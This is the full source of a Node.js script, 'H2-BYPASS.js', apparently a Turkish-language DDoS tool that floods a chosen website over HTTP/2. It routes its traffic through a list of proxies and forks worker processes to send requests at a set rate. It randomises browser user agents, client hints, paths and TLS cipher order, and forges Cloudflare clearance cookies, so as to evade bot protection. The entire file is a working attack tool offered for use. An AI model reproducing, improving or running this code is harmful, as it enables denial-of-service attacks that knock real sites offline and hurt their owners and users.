"use strict";

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");
const crypto = require("crypto");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});

if (process.argv.length < 7) {
    console.log(`Kullanım: node H2-BYPASS.js [HEDEF] [SÜRE] [HIZ] [THREAD] [PROXY_DOSYASI]`);
    process.exit();
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6],
};

const proxies = fs.readFileSync(args.proxyFile, "utf-8").split(/\r?\n/).filter(Boolean);
const parsedTarget = url.parse(args.target);

const paths = [
    "/", "/login", "/register", "/api/v1/user", "/search?q=" + crypto.randomBytes(3).toString("hex"),
    "/index.php", "/shop/checkout", "/wp-admin/admin-ajax.php", "/contact", "/products"
];

// Kapsamlı Browser ve Cihaz Havuzu
const browserPool = [
    // Windows
    { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36", platform: "Windows", mobile: "?0", ch: '"Chromium";v="125", "Google Chrome";v="125"' },
    { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0", platform: "Windows", mobile: "?0", ch: 'Firefox' },
    { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0", platform: "Windows", mobile: "?0", ch: '"Microsoft Edge";v="125"' },
    // Mobile (iOS/Android)
    { ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1", platform: "iOS", mobile: "?1", ch: '"Safari";v="17"' },
    { ua: "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Mobile Safari/537.36", platform: "Android", mobile: "?1", ch: '"Android";v="14", "Chromium";v="125"' },
    // Yandex & Safari Mac
    { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15", platform: "macOS", mobile: "?0", ch: '"Safari";v="17"' },
    { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 YaBrowser/24.4.0.0 Safari/537.36", platform: "Windows", mobile: "?0", ch: '"Yandex";v="24"' }
];

const cipherList = ["TLS_AES_128_GCM_SHA256", "TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256", "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-RSA-AES256-GCM-SHA384"];

function shuffle(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array.join(":");
}

if (cluster.isMaster) {
    console.log(`[!] H2-BYPASS: Method developed by Genisys`);
    for (let i = 0; i < args.threads; i++) cluster.fork();
    setTimeout(() => process.exit(0), args.time * 1000);
} else {
    setInterval(runFlooder, 1);
}

function runFlooder() {
    const proxyAddr = proxies[Math.floor(Math.random() * proxies.length)];
    if (!proxyAddr) return;

    const [proxyHost, proxyPort] = proxyAddr.split(":");
    const connection = net.connect(parseInt(proxyPort), proxyHost);

    connection.once("connect", () => {
        connection.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}:443\r\n\r\n`);
    });

    connection.once("data", (chunk) => {
        if (!chunk.toString().includes("HTTP/1.1 200")) { connection.destroy(); return; }

        const tlsConn = tls.connect({
            socket: connection,
            servername: parsedTarget.hostname,
            ALPNProtocols: ["h2"],
            ciphers: shuffle([...cipherList]),
            rejectUnauthorized: false
        });

        tlsConn.once("secureConnect", () => {
            const client = http2.connect(args.target, {
                createConnection: () => tlsConn,
                settings: { initialWindowSize: 6291456 + Math.floor(Math.random() * 4096) }
            });

            client.on("connect", () => {
                const attackInterval = setInterval(() => {
                    for (let i = 0; i < args.rate; i++) {
                        const browser = browserPool[Math.floor(Math.random() * browserPool.length)];
                        const randomPath = paths[Math.floor(Math.random() * paths.length)];
                        const isPost = Math.random() > 0.7; // %30 POST, %70 GET
                        
                        const headers = {
                            ":method": isPost ? "POST" : "GET",
                            ":authority": parsedTarget.host,
                            ":scheme": "https",
                            ":path": randomPath,
                            "user-agent": browser.ua,
                            "sec-ch-ua": browser.ch,
                            "sec-ch-ua-mobile": browser.mobile,
                            "sec-ch-ua-platform": `"${browser.platform}"`,
                            "accept": "text/html,application/xhtml+xml,*/*",
                            "accept-encoding": "gzip, deflate, br",
                            "cookie": `_cfuvid=${crypto.randomBytes(10).toString("hex")}; cf_clearance=${crypto.randomBytes(20).toString("hex")}`,
                            "content-type": isPost ? "application/json" : undefined
                        };

                        const req = client.request(headers);
                        if (isPost) req.write(JSON.stringify({ data: crypto.randomBytes(16).toString("hex") }));
                        req.on("response", () => { req.close(); req.destroy(); });
                        req.end();
                    }
                }, 1000);
                setTimeout(() => { clearInterval(attackInterval); client.close(); connection.destroy(); }, 12000);
            });
            client.on("error", () => { client.destroy(); connection.destroy(); });
        });
    });
    connection.on("error", () => { connection.destroy(); });
}